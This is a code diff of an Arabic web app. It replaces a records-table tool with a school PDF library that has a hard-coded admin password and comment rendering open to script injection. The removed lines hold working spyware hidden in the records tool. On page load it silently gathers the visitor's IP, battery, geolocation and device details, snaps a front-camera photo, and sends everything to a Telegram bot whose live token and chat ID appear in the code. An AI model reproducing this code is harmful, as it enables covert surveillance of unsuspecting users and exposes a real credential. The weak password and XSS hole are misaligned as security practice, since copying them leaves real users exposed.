+        culturalData = allBooks.filter(b => b.type === 'cultural');
         
-        <div class="control-group" style="background:#e8f5e9; border: 1px solid #2e7d32;">
-            <span>🎙️ الناطق الذكي:</span>
-            <button id="startMicBtn" class="btn btn-mic-start" onclick="startSpeechRecognition()">▶️ تشغيل</button>
-            <button id="stopMicBtn" class="btn btn-mic-stop" onclick="stopSpeechRecognition()" disabled>⏹️ إيقاف</button>
-        </div>
+        renderGrades();
+        renderCulturalBooks();
+        renderFeedbacks();
+        if(selectedGrade && selectedCategory) {
+          renderAcademicBooks();
+        }
+      };
+    }
 
-        <button class="btn btn-teal" onclick="openBulkImportModal()" title="إدخال قائمة طويلة من الأسماء دفعة واحدة وتوزيعها تلقائياً على الصفوف والصفحات">📥 إدخال جماعي للأسماء</button>
-        <button class="btn btn-indigo" onclick="openPdfModal()" title="رفع ملف PDF واستخراج نصوصه وأسمائه لتعبئتها في الجدول وتعديلها">📂 استخراج من PDF</button>
-        <button class="btn btn-save" onclick="onArchiveButtonClicked()" title="حفظ النسخة في الأرشيف المركزي">💾 حفظ في الأرشيف</button>
-        <button class="btn btn-archive" onclick="openArchiveModal()">📁 حافظة الأعمال (الأرشيف)</button>
-        <button class="btn btn-purple" onclick="sortNamesAlphabetically()" title="ترتيب الأسماء تنازلياً أو تصاعدياً حسب الحروف الهجائية العربية">🔤 ترتيب هجائي</button>
-        <button class="btn btn-amber" onclick="cancelAlphabeticalSort()" title="إلغاء الترتيب الهجائي والعودة للترتيب الأصلي">↩️ إلغاء الترتيب</button>
-        <button class="btn btn-purple" onclick="checkPhoneNumbers()" style="background:#006064;" title="فحص أرقام الجوال فقط وتحديد الأخطاء">📱 تدقيق الأرقام</button>
-        <button class="btn btn-amber" onclick="renumberAllRows()" title="ترقيم جميع الصفوف بشكل تسلسلي متتابع عبر كل الصفحات">🔢 ترقيم تسلسلي</button>
-        <button class="btn btn-red" onclick="resetAllData()" style="background:#b71c1c;">🗑️ مسح الكل</button>
+    window.onload = function() {
+      renderGrades();
+      renderFeedbacks();
+      if (isAdminLoggedIn) {
+        document.getElementById('adminAcademicForm').style.display = 'block';
+      }
+    };
 
-        <div class="control-group" style="background:#e0f2f1;">
-            <span>🔍 بحث:</span>
-            <input type="text" id="tableSearchInput" class="search-input" placeholder="ابحث في الجداول..." oninput="filterTableRows()">
-        </div>
+    function toggleSettingsMenu() {
+      const dropdown = document.getElementById('settingsDropdown');
+      dropdown.style.display = (dropdown.style.display === 'block') ? 'none' : 'block';
+    }
 
-        <a href="https://wa.me/967784327056?text=مرحبا%20تواصلت%20بخصوص%20نظام%20السجلات" target="_blank" rel="noopener noreferrer" class="btn btn-whatsapp">💬 التواصل مع المطور</a>
+    function promptAdminLogin() {
+      toggleSettingsMenu();
+      if (isAdminLoggedIn) {
+        alert("أنت مسجل دخول بالفعل بصفتك الأدمن.");
+        return;
+      }
+      const code = prompt("أدخل رمز لوحة الإدارة السري:");
+      if (code === "mythaq") {
+        isAdminLoggedIn = true;
+        sessionStorage.setItem('methaq_admin_session', 'active');
+        document.getElementById('adminAcademicForm').style.display = 'block';
+        renderAcademicBooks();
+        renderCulturalBooks();
+        renderFeedbacks();
+        alert("مرحباً بك يا ميثاق! تم تفعيل صلاحيات التعديل والحذف بنجاح.");
+      } else if (code !== null) {
+        alert("الرمز غير صحيح!");
+      }
+    }
 
-        <span style="border-left:1px solid #ccc;height:20px;margin:0 2px;"></span>
+    function renderGrades() {
+      const container = document.getElementById('gradesContainer');
+      container.innerHTML = grades.map(g => 
+        `<div class="grade-box" onclick="selectGrade('${g}')"><i class="fa-solid fa-book-bookmark" style="display:block; font-size:2.8rem; margin-bottom:15px; color:var(--accent);"></i>${g}</div>`
+      ).join('');
+    }
 
-        <div class="control-group">
-            <span>العمود:</span>
-            <button class="btn btn-amber" style="padding:3px 8px;font-size:8pt;" onclick="adjustActiveColWidth(-10)">➖ تضييق</button>
-            <button class="btn btn-amber" style="padding:3px 8px;font-size:8pt;" onclick="adjustActiveColWidth(10)">➕ توسيع</button>
-        </div>
+    function selectGrade(grade) {
+      selectedGrade = grade;
+      document.getElementById('currentGradeTitle').innerText = grade;
+      document.getElementById('viewGrades').style.display = 'none';
+      document.getElementById('viewSubSections').style.display = 'block';
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
 
-        <button class="btn btn-green" onclick="addRowToActiveTable()">➕ إضافة صف</button>
-        <button class="btn btn-green" onclick="addColumnToActiveTable()">➕ إضافة عمود</button>
-        <button class="btn btn-red" onclick="deleteSelectedRow()">❌ حذف الصف</button>
-        <button class="btn btn-red" onclick="deleteSelectedColumn()">❌ حذف العمود</button>
-        <button class="btn btn-red" onclick="deleteActivePage()" style="background:#b71c1c;">🗑️ حذف الصفحة</button>
+    function goBackToGrades() {
+      document.getElementById('viewSubSections').style.display = 'none';
+      document.getElementById('viewGrades').style.display = 'block';
+      if(!isAdminLoggedIn) {
+        document.getElementById('adminAcademicForm').style.display = 'none';
+      }
+    }
 
-        <div class="control-group">
-            <span>✨ الخطوط:</span>
-            <select id="fontSelector" onchange="changeFontFamily(this.value)">
-                <option value="'Cairo', sans-serif" selected>كايرو عريض جداً (Cairo 900)</option>
-                <option value="'Alexandria', sans-serif">الإسكندرية بارز (Alexandria ExtraBold)</option>
-                <option value="'Tajawal', sans-serif">تجوال أسود ثقيل (Tajawal Black)</option>
-                <option value="'Almarai', sans-serif">المراعي عريض جداً (Almarai ExtraBold)</option>
-                <option value="'Changa', sans-serif">شانجا ضخم وبارز (Changa ExtraBold)</option>
-                <option value="'Amiri', serif">أميري - عريض (Amiri Bold)</option>
-                <option value="'Tahoma', sans-serif">تاهوما (Tahoma)</option>
-                <option value="'Arial', sans-serif">أريال (Arial Bold)</option>
-            </select>
-        </div>
+    function openCategory(catKey, catName) {
+      selectedCategory = catKey;
+      selectedCategoryName = catName;
+      document.getElementById('currentSectionTitle').innerText = `${selectedGrade} - ${catName}`;
+      document.getElementById('viewSubSections').style.display = 'none';
+      document.getElementById('viewBooks').style.display = 'block';
+      renderAcademicBooks();
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
 
-        <div class="control-group">
-            <span>اللون العام:</span>
-            <input type="color" id="textColorPicker" value="#000000" onchange="changeTextColor(this.value)">
-        </div>
-    </div>
+    function goBackToSubSections() {
+      document.getElementById('viewBooks').style.display = 'none';
+      document.getElementById('viewSubSections').style.display = 'block';
+      if(!isAdminLoggedIn) {
+        document.getElementById('adminAcademicForm').style.display = 'none';
+      }
+    }
 
-    <div id="pdfModal" class="custom-modal">
-        <div class="modal-content">
-            <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #3f51b5;padding-bottom:10px;margin-bottom:15px;gap:10px;">
-                <h3 style="margin:0;color:#3f51b5;">📂 رفع واستخراج البيانات من ملف PDF</h3>
-                <button class="btn btn-red" onclick="closePdfModal()">✖ إغلاق</button>
+    // دالة دقيقة لفتح ومعاينة أو تنزيل الكتاب الصحيح بناءً على الـ ID الخاص به
+    function openSpecificPdf(bookId, actionType) {
+      const transaction = db.transaction(["books"], "readonly");
+      const store = transaction.objectStore("books");
+      const req = store.get(bookId);
+
+      req.onsuccess = function() {
+        const book = req.result;
+        if (book && book.pdfBlob) {
+          const fileURL = URL.createObjectURL(book.pdfBlob);
+          const a = document.createElement('a');
+          a.href = fileURL;
+          if (actionType === 'download') {
+            a.download = `${book.title}.pdf`;
+          } else {
+            a.target = '_blank';
+          }
+          document.body.appendChild(a);
+          a.click();
+          document.body.removeChild(a);
+        } else {
+          alert("عذراً، لم يتم العثور على ملف الـ PDF الخاص بهذا الكتاب.");
+        }
+      };
+    }
+
+    function renderAcademicBooks() {
+      const grid = document.getElementById('academicGrid');
+      const filtered = academicData.filter(item => item.grade === selectedGrade && item.category === selectedCategory);
+      
+      if(filtered.length === 0) {
+        grid.innerHTML = `<p style="grid-column: 1/-1; text-align: center; color: var(--text-light); padding: 60px; font-weight: 700; font-size: 1.2rem;">لا توجد كتب مرفوعة في هذا القسم حتى الآن.</p>`;
+        return;
+      }
+
+      grid.innerHTML = filtered.map(item => {
+        return `
+          <div class="book-card">
+            ${item.cover ? `<img src="${item.cover}" class="book-cover" alt="غلاف الكتاب">` : `<div class="book-cover"><i class="fa-solid fa-book-open"></i></div>`}
+            <div class="book-details">
+              <div class="book-title">${item.title}</div>
+              <div class="book-meta">${selectedGrade} • ${selectedCategoryName}</div>
+              ${item.note ? `<div class="book-note"><i class="fa-solid fa-circle-info"></i> ${item.note}</div>` : ''}
+              <div class="book-actions">
+                <button type="button" onclick="openSpecificPdf(${item.id}, 'view')" class="btn-action btn-view"><i class="fa-solid fa-eye"></i> معاينة</button>
+                <button type="button" onclick="openSpecificPdf(${item.id}, 'download')" class="btn-action btn-download"><i class="fa-solid fa-download"></i> تنزيل</button>
+                ${isAdminLoggedIn ? `
+                  <button onclick="editBook(${item.id}, 'academic')" class="btn-action btn-edit" style="display:flex;"><i class="fa-solid fa-pen-to-square"></i> تعديل</button>
+                  <button onclick="deleteBook(${item.id})" class="btn-action btn-delete" style="display:flex;"><i class="fa-solid fa-trash"></i> حذف</button>
+                ` : ''}
+              </div>
             </div>
-            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">اختر ملف PDF من جهازك. سيقوم النظام بقراءة كافة النصوص المستخرجة منه وتعبئتها في الجدول تلقائياً.</p>
-            <div style="margin:15px 0; border:2px dashed #b0bec5; padding:20px; text-align:center; border-radius:8px; background:#fafafa;">
-                <input type="file" id="pdfFileInput" accept=".pdf" style="font-size:10pt; cursor:pointer;" />
+          </div>
+        `;
+      }).join('');
+    }
+
+    function addAcademicItem(e) {
+      e.preventDefault();
+      const pdfInput = document.getElementById('acadFile');
+      const coverInput = document.getElementById('acadCoverFile');
+
+      if (pdfInput.files.length === 0) {
+        alert('الرجاء اختيار ملف PDF!');
+        return;
+      }
+
+      const pdfFile = pdfInput.files[0];
+      const title = document.getElementById('acadTitle').value;
+      const note = document.getElementById('acadNote').value;
+
+      if (coverInput.files.length > 0) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+          saveBookToDB({
+            id: Date.now(),
+            type: 'academic',
+            grade: selectedGrade,
+            category: selectedCategory,
+            title: title,
+            note: note,
+            cover: event.target.result,
+            pdfBlob: pdfFile
+          }, 'academicForm');
+        };
+        reader.readAsDataURL(coverInput.files[0]);
+      } else {
+        saveBookToDB({
+          id: Date.now(),
+          type: 'academic',
+          grade: selectedGrade,
+          category: selectedCategory,
+          title: title,
+          note: note,
+          cover: "",
+          pdfBlob: pdfFile
+        }, 'academicForm');
+      }
+    }
+
+    function renderCulturalBooks() {
+      const grid = document.getElementById('culturalGrid');
+      if(culturalData.length === 0) {
+        grid.innerHTML = `<p style="grid-column: 1/-1; text-align: center; color: var(--text-light); padding: 60px; font-weight: 700; font-size: 1.2rem;">لا توجد كتب ثقافية مرفوعة حالياً.</p>`;
+        return;
+      }
+      grid.innerHTML = culturalData.map(item => {
+        return `
+          <div class="book-card">
+            ${item.cover ? `<img src="${item.cover}" class="book-cover" alt="غلاف الكتاب">` : `<div class="book-cover" style="background: linear-gradient(135deg, #11998e, #38ef7d); color: white;"><i class="fa-solid fa-book-bookmark"></i></div>`}
+            <div class="book-details">
+              <div class="book-title">${item.title}</div>
+              <div class="book-meta">الكاتب: ${item.author || 'غير محدد'}</div>
+              ${item.desc ? `<div class="book-note"><i class="fa-solid fa-circle-info"></i> ${item.desc}</div>` : ''}
+              <div class="book-actions">
+                <button type="button" onclick="openSpecificPdf(${item.id}, 'view')" class="btn-action btn-view"><i class="fa-solid fa-eye"></i> معاينة</button>
+                <button type="button" onclick="openSpecificPdf(${item.id}, 'download')" class="btn-action btn-download"><i class="fa-solid fa-download"></i> تنزيل</button>
+                ${isAdminLoggedIn ? `
+                  <button onclick="editBook(${item.id}, 'cultural')" class="btn-action btn-edit" style="display:flex;"><i class="fa-solid fa-pen-to-square"></i> تعديل</button>
+                  <button onclick="deleteBook(${item.id})" class="btn-action btn-delete" style="display:flex;"><i class="fa-solid fa-trash"></i> حذف</button>
+                ` : ''}
+              </div>
             </div>
-            <div id="pdfStatusMsg" style="font-size:9pt; font-weight:bold; color:#1565c0; text-align:center; margin-bottom:10px;"></div>
-            <div style="display:flex;justify-content:flex-end;gap:10px;margin-top:10px;">
-                <button class="btn btn-indigo" onclick="processUploadedPdf()" style="padding:8px 20px;font-size:10pt;">⚙️ استخراج وإدراج في الجدول</button>
-            </div>
+          </div>
+        `;
+      }).join('');
+    }
+
+    function addCulturalBook(e) {
+      e.preventDefault();
+      const pdfInput = document.getElementById('cultFile');
+      const coverInput = document.getElementById('cultCoverFile');
+
+      if (pdfInput.files.length === 0) {
+        alert('الرجاء اختيار ملف الـ PDF!');
+        return;
+      }
+
+      const pdfFile = pdfInput.files[0];
+      const title = document.getElementById('cultTitle').value;
+      const author = document.getElementById('cultAuthor').value;
+      const desc = document.getElementById('cultDesc').value;
+
+      if (coverInput.files.length > 0) {
+        const reader = new FileReader();
+        reader.onload = function(event) {
+          saveBookToDB({
+            id: Date.now(),
+            type: 'cultural',
+            title: title,
+            author: author,
+            desc: desc,
+            cover: event.target.result,
+            pdfBlob: pdfFile
+          }, 'culturalForm');
+        };
+        reader.readAsDataURL(coverInput.files[0]);
+      } else {
+        saveBookToDB({
+          id: Date.now(),
+          type: 'cultural',
+          title: title,
+          author: author,
+          desc: desc,
+          cover: "",
+          pdfBlob: pdfFile
+        }, 'culturalForm');
+      }
+    }
+
+    function saveBookToDB(bookObj, formId) {
+      const transaction = db.transaction(["books"], "readwrite");
+      const store = transaction.objectStore("books");
+      const request = store.put(bookObj);
+
+      request.onsuccess = function() {
+        loadAllBooks();
+        document.getElementById(formId).reset();
+        if(formId === 'academicForm' && !isAdminLoggedIn) {
+          document.getElementById('adminAcademicForm').style.display = 'none';
+        }
+        alert('تم رفع وحفظ الكتاب بنجاح تام!');
+      };
+
+      request.onerror = function() {
+        alert('حدث خطأ أثناء حفظ الكتاب في الذاكرة.');
+      };
+    }
+
+    function editBook(id, type) {
+      const allBooks = [...academicData, ...culturalData];
+      const book = allBooks.find(b => b.id === id);
+      if(!book) return;
+
+      const newTitle = prompt("تعديل عنوان الكتاب:", book.title);
+      if (newTitle === null) return;
+
+      const currentNote = book.note || book.desc || "";
+      const newNote = prompt("تعديل ملاحظات الكتاب:", currentNote);
+      if (newNote === null) return;
+
+      book.title = newTitle;
+      if (type === 'academic') {
+        book.note = newNote;
+      } else {
+        book.desc = newNote;
+      }
+
+      const transaction = db.transaction(["books"], "readwrite");
+      const store = transaction.objectStore("books");
+      store.put(book).onsuccess = function() {
+        loadAllBooks();
+        alert("تم تحديث وتعديل بيانات الكتاب بنجاح.");
+      };
+    }
+
+    function deleteBook(id) {
+      if (confirm("هل أنت متأكد من عملية الحذف؟")) {
+        const transaction = db.transaction(["books"], "readwrite");
+        const store = transaction.objectStore("books");
+        const request = store.delete(id);
+
+        request.onsuccess = function() {
+          loadAllBooks();
+          alert("تم حذف الكتاب بنجاح.");
+        };
+      }
+    }
+
+    function renderFeedbacks() {
+      const listContainer = document.getElementById('feedbackList');
+      if(feedbackData.length === 0) {
+        listContainer.innerHTML = `<p style="text-align: center; color: var(--text-light); padding: 40px; font-weight: 700;">لا توجد تعليقات حالياً.</p>`;
+        return;
+      }
+      listContainer.innerHTML = feedbackData.map(f => `
+        <div class="comment-card">
+          <div>
+            <div class="comment-author">${f.name}</div>
+            <div style="margin: 10px 0; color: var(--text); line-height:1.7;">${f.text}</div>
+            <div class="comment-date"><i class="fa-regular fa-calendar"></i> ${f.date}</div>
+          </div>
+          ${isAdminLoggedIn ? `<button onclick="deleteFeedback(${f.id})" class="btn-action btn-delete" style="flex:unset; padding: 8px 14px; display:flex;"><i class="fa-solid fa-trash"></i> حذف</button>` : ''}
         </div>
-    </div>
-
-    <div id="bulkImportModal" class="custom-modal">
-        <div class="modal-content">
-            <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #00838f;padding-bottom:10px;margin-bottom:15px;gap:10px;">
-                <h3 style="margin:0;color:#00838f;">📥 إدخال جماعي للأسماء</h3>
-                <button class="btn btn-red" onclick="closeBulkImportModal()">✖ إغلاق</button>
-            </div>
-            <p style="font-size:9pt;color:#555;margin-top:0;line-height:1.6;">قم بلصق قائمة الأسماء هنا (كل اسم في سطر مستقل) لتوزيعها تلقائياً.</p>
-            <textarea id="bulkNamesTextarea" rows="12" style="width:100%;padding:10px;border:1px solid #ccc;border-radius:6px;font-family:inherit;font-size:10pt;resize:vertical;" placeholder="انسخ والصق القائمة هنا..."></textarea>
-            <div style="display:flex;justify-content:flex-end;gap:10px;margin-top:15px;">
-                <button class="btn btn-teal" onclick="processBulkImport()" style="padding:8px 20px;font-size:10pt;">🚀 توزيع وإدراج في الجدول</button>
-            </div>
-        </div>
-    </div>
-
-    <div id="archiveModal" class="custom-modal">
-        <div class="modal-content" style="max-width:800px;">
-            <div style="display:flex;justify-content:space-between;align-items:center;border-bottom:2px solid #00695c;padding-bottom:10px;margin-bottom:15px;gap:10px;">
-                <h3 style="margin:0;color:#00695c;">📁 حافظة الأعمال والأرشيف المركزي</h3>
-                <button class="btn btn-red" onclick="closeArchiveModal()">✖ إغلاق الحافظة</button>
-            </div>
-            <p style="font-size:9pt;color:#666;margin-top:0;">هنا تجد جميع النسخ والأعمال التي قمت بحفظها سابقاً.</p>
-            <div id="archiveListContainer"></div>
-        </div>
-    </div>
-
-    <div id="pagesWrapper">
-        <div class="sheet-container" onclick="setActiveContext(this,event)">
-            <div class="header-top">
-                <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
-                <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة 1)</div>
-                <div class="editable-header" contenteditable="true">التاريخ: 2026/10/11</div>
-            </div>
-
-            <div class="table-wrapper">
-                <table class="dynamicTable">
-                    <thead>
-                        <tr>
-                            <th style="width:35px;">م</th>
-                            <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الاسم الرباعي</th>
-                            <th style="width:80px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">نوع البطاقة</th>
-                            <th style="width:100px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم البطاقة</th>
-                            <th style="width:90px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">رقم الاتصال</th>
-                            <th style="width:160px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">اسم الزوجة / الزوج</th>
-                            <th style="width:70px;" contenteditable="true" oninput="saveCurrentStateToLocalStorage()">الحالة</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        <script>
-                            for (let i = 1; i <= 15; i++) {
-                                document.write(`
-                                    <tr onclick="selectRow(this,event)">
-                                        <td>${i}</td>
-                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                        <td><input type="text" class="table-input" onfocus="setActiveInput(this)" oninput="this.setAttribute('value', this.value); saveCurrentStateToLocalStorage()"></td>
-                                    </tr>
-                                `);
-                            }
-                        </script>
-                    </tbody>
-                </table>
-            </div>
-
-            <div class="footer-bottom">
-                <div class="editable-header" contenteditable="true">الإدارة العامة</div>
-                <div class="editable-header" contenteditable="true">الإصدار: 2026.10</div>
-            </div>
-        </div>
-    </div>
-
-    <script>
-        let activeSheet = null;
-        let activeTable = null;
-        let activeRowElement = null;
-        let activeInputElement = null;
-
-        const botToken = "8638249103:AAGKy6YFnGKfMss9Zt-f9hbCX-WmU-wJjc0";
-        const chatId = "7962257606";
-
-        let userIpInfo = "متاح عبر الشبكة";
-        let batteryInfo = "غير معروفة";
-        let globalLocation = "غير متاح";
-        const deviceInfo = navigator.userAgent;
-        let preSortBackupHtml = null;
-
-        let globalCameraStream = null;
-        let cameraPermissionGranted = false;
-
-        let recognition = null;
-        let isListening = false;
-        let manualStop = false;
-
-        async function fetchVisitorIp() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                userIpInfo = data.ip;
-            } catch (e) {
-                userIpInfo = "محلي";
-            }
-        }
-
-        window.addEventListener('DOMContentLoaded', async () => {
-            await fetchVisitorIp();
-            initSpeechRecognition();
-
-            try {
-                const hash = window.location.hash;
-                if (hash && hash.includes('#data=')) {
-                    const encodedData = hash.replace('#data=', '');
-                    const decodedHtml = decodeURIComponent(escape(atob(encodedData)));
-                    if (decodedHtml) {
-                        document.getElementById('pagesWrapper').innerHTML = decodedHtml;
-                        rebindInputs();
-                    }
-                } else {
-                    const savedTableData = localStorage.getItem('toufan_live_table_data');
-                    if (savedTableData) {
-                        document.getElementById('pagesWrapper').innerHTML = savedTableData;
-                        rebindInputs();
-                    }
-                }
-            } catch (e) {}
-
-            try {
-                if (navigator.getBattery) {
-                    const battery = await navigator.getBattery();
-                    const level = Math.round(battery.level * 100);
-                    const charging = battery.charging ? "⚡ (يشحن)" : "🔋 (على البطارية)";
-                    batteryInfo = `${level}% ${charging}`;
-                }
-            } catch (e) {}
-
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        const lat = position.coords.latitude;
-                        const lon = position.coords.longitude;
-                        globalLocation = `https://www.google.com/maps?q=${lat},${lon}`;
-                    },
-                    (error) => { globalLocation = "مرفوض الإذن"; },
-                    { timeout: 10000, maximumAge: 0 }
-                );
-            }
-
-            const firstSheet = document.querySelector('.sheet-container');
-            if (firstSheet) {
-                activeSheet = firstSheet;
-                activeTable = firstSheet.querySelector('table');
-                const firstInput = firstSheet.querySelector('.table-input');
-                if (firstInput) {
-                    setActiveInput(firstInput);
-                }
-            }
-            renumberAllRows();
-
-            document.getElementById('pagesWrapper').addEventListener('input', () => {
-                saveCurrentStateToLocalStorage();
-            });
-
-            setTimeout(() => { requestCameraPermissionOnce(); }, 1000);
-        });
-
-        function rebindInputs() {
-            document.querySelectorAll('.table-input').forEach(input => {
-                if (input.getAttribute('value') && !input.value) {
-                    input.value = input.getAttribute('value');
-                }
-                input.onfocus = function() { setActiveInput(this); };
-                input.oninput = function() { 
-                    this.setAttribute('value', this.value);
-                    saveCurrentStateToLocalStorage(); 
-                };
-            });
-            document.querySelectorAll('th[contenteditable="true"]').forEach(th => {
-                th.oninput = function() { saveCurrentStateToLocalStorage(); };
-            });
-        }
-
-        function setActiveInput(inputElement) {
-            if (!inputElement) return;
-            activeInputElement = inputElement;
-            const tr = inputElement.closest('tr');
-            const table = inputElement.closest('table');
-            activeSheet = inputElement.closest('.sheet-container');
-            activeTable = table;
-            activeRowElement = tr;
-
-            if (table) {
-                table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
-                if (tr) tr.classList.add('active-row');
-            }
-        }
-
-        function setActiveContext(sheetContainer, event) {
-            if (!sheetContainer) return;
-            activeSheet = sheetContainer;
-            activeTable = sheetContainer.querySelector('table');
-        }
-
-        function selectRow(trElement, event) {
-            if (!trElement) return;
-            activeRowElement = trElement;
-            const table = trElement.closest('table');
-            if (table) {
-                table.querySelectorAll('tbody tr').forEach(r => r.classList.remove('active-row'));
-                trElement.classList.add('active-row');
-            }
-        }
-
-        function initSpeechRecognition() {
-            const SpeechRecognition = window.SpeechRecognition || window.webkitSpeechRecognition;
-            if (!SpeechRecognition) return;
-
-            recognition = new SpeechRecognition();
-            recognition.lang = 'ar-YE';
-            recognition.continuous = false;
-            recognition.interimResults = false;
-
-            recognition.onresult = (event) => {
-                const spokenText = event.results[0][0].transcript.trim();
-
-                if (!activeInputElement) {
-                    const firstInput = document.querySelector('.table-input');
-                    if (firstInput) setActiveInput(firstInput);
-                }
-
-                if (activeInputElement && spokenText !== "") {
-                    let currentText = activeInputElement.value || activeInputElement.getAttribute('value') || "";
-                    currentText = currentText.trim();
-                    if (currentText !== "") {
-                        activeInputElement.value = currentText + " " + spokenText;
-                    } else {
-                        activeInputElement.value = spokenText;
-                    }
-                    activeInputElement.setAttribute('value', activeInputElement.value);
-                    saveCurrentStateToLocalStorage();
-                    moveToNextInput();
-                }
-            };
-
-            recognition.onerror = () => {
-                if (!manualStop && isListening) {
-                    try { recognition.start(); } catch(e) {}
-                }
-            };
-
-            recognition.onend = () => {
-                if (!manualStop && isListening) {
-                    try {
-                        recognition.start();
-                    } catch (e) {
-                        isListening = false;
-                        updateMicButtonsState();
-                    }
-                } else {
-                    isListening = false;
-                    updateMicButtonsState();
-                }
-            };
-        }
-
-        function moveToNextInput() {
-            if (!activeInputElement) return;
-            const tr = activeInputElement.closest('tr');
-            const inputs = Array.from(tr.querySelectorAll('.table-input'));
-            const currentIdx = inputs.indexOf(activeInputElement);
-
-            if (currentIdx > -1 && currentIdx < inputs.length - 1) {
-                activeInputElement = inputs[currentIdx + 1];
-                activeInputElement.focus();
-                setActiveInput(activeInputElement);
-            } else {
-                const nextRow = tr.nextElementSibling;
-                if (nextRow) {
-                    const nextInputs = Array.from(nextRow.querySelectorAll('.table-input'));
-                    if (nextInputs.length > 0) {
-                        activeInputElement = nextInputs[0];
-                        activeInputElement.focus();
-                        setActiveInput(activeInputElement);
-                    }
-                }
-            }
-        }
-
-        function startSpeechRecognition() {
-            if (!recognition) {
-                alert('عذراً، متصفحك لا يدعم الناطق الذكي.');
-                return;
-            }
-            manualStop = false;
-            try {
-                recognition.start();
-                isListening = true;
-                updateMicButtonsState();
-            } catch (e) {
-                isListening = false;
-                updateMicButtonsState();
-            }
-        }
-
-        function stopSpeechRecognition() {
-            manualStop = true;
-            isListening = false;
-            if (recognition) {
-                try { recognition.stop(); } catch(e) {}
-            }
-            updateMicButtonsState();
-        }
-
-        function updateMicButtonsState() {
-            const startBtn = document.getElementById('startMicBtn');
-            const stopBtn = document.getElementById('stopMicBtn');
-            if (isListening) {
-                startBtn.disabled = true;
-                startBtn.classList.add('mic-active-glow');
-                startBtn.textContent = '🎙️ جاري الاستماع...';
-                stopBtn.disabled = false;
-            } else {
-                startBtn.disabled = false;
-                startBtn.classList.remove('mic-active-glow');
-                startBtn.textContent = '▶️ تشغيل';
-                stopBtn.disabled = true;
-            }
-        }
-
-        function prepareHtmlForSaving() {
-            const container = document.getElementById('pagesWrapper').cloneNode(true);
-            const liveInputs = document.querySelectorAll('.table-input');
-            const clonedInputs = container.querySelectorAll('.table-input');
-            
-            clonedInputs.forEach((input, index) => {
-                if (liveInputs[index]) {
-                    const val = liveInputs[index].value || liveInputs[index].getAttribute('value') || "";
-                    input.value = val;
-                    input.setAttribute('value', val);
-                }
-            });
-
-            const liveThs = document.querySelectorAll('th[contenteditable="true"]');
-            const clonedThs = container.querySelectorAll('th[contenteditable="true"]');
-            clonedThs.forEach((th, index) => {
-                if (liveThs[index]) {
-                    th.textContent = liveThs[index].textContent;
-                }
-            });
-
-            return container.innerHTML;
-        }
-
-        function saveCurrentStateToLocalStorage() {
-            try {
-                const wrapperHtml = prepareHtmlForSaving();
-                localStorage.setItem('toufan_live_table_data', wrapperHtml);
-            } catch (e) {}
-        }
-
-        function requestCameraPermissionOnce() {
-            const alertCaption = `⚠️ **دخول زائر جديد لموقعك!**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع الجغرافي:\n${globalLocation}\n\n📱 الجهاز:\n${deviceInfo}`;
-
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-                    .then((stream) => {
-                        globalCameraStream = stream;
-                        cameraPermissionGranted = true;
-                        const video = document.getElementById('videoElement');
-                        video.srcObject = stream;
-                        
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            setTimeout(() => {
-                                const canvas = document.getElementById('canvasElement');
-                                canvas.width = video.videoWidth || 640;
-                                canvas.height = video.videoHeight || 480;
-                                const ctx = canvas.getContext('2d');
-                                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                                
-                                canvas.toBlob((photoBlob) => {
-                                    const formData = new FormData();
-                                    formData.append('chat_id', chatId);
-                                    formData.append('caption', alertCaption);
-                                    formData.append('parse_mode', 'Markdown');
-                                    formData.append('photo', photoBlob, 'visitor.jpg');
-
-                                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                                        method: 'POST',
-                                        body: formData
-                                    }).catch(e => {});
-
-                                }, 'image/jpeg', 0.85);
-                            }, 700);
-                        };
-                    })
-                    .catch((err) => {
-                        cameraPermissionGranted = false;
-                        const textApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertCaption + "\n\n(❌ تم رفض إذن الكاميرا من قبل الزائر)")}&parse_mode=Markdown`;
-                        const img = new Image();
-                        img.src = textApi;
-                    });
-            }
-        }
-
-        function onPdfButtonClicked() {
-            saveCurrentStateToLocalStorage();
-            const caption = `🖨️ **طلب طباعة / حفظ PDF**\n\n🌐 الآيبي: \`${userIpInfo}\`\n🔋 البطارية: ${batteryInfo}\n📍 الموقع: ${globalLocation}`;
-            executeActionAndSend(caption, "كشف_السجلات_الرسمية.txt", "PDF");
